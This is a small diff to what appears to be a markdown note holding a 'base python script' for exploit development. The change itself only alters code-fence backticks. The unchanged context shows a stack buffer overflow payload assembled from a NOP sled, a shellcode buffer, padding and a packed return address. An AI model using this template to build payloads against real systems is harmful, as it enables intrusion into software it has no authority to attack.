@@ -2,7 +2,7 @@
 
 ## Base python script
 
-`
+``
 
 from struct import pack
 
@@ -31,5 +31,5 @@ payload = nop_payload + buf + padding + pack("<Q", jumpadd)
 
 print(payload)
 
-`
+``
 
